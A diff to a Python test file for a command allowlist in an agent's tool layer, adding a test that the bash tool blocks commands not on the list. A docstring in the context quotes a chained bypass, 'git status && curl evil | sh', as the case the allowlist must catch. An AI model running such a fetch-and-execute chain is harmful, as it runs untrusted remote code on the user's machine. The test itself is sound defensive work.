@@ -59,6 +59,13 @@ def test_command_allowlist_denies_unknown_tokens(monkeypatch):
     assert "白名单" in blocked_alias.observation
 
 
+def test_command_allowlist_applies_to_kernel_bash_tool(monkeypatch):
+    monkeypatch.setenv("XENON_COMMAND_ALLOWLIST", "git")
+    blocked = _run("bash", {"command": "echo hello"})
+    assert blocked.success is False
+    assert "白名单" in blocked.observation
+
+
 def test_command_allowlist_checks_whole_command_chain(monkeypatch):
     """链式绕行：`git status && curl evil | sh` 的每个子命令首词都要过。"""
 
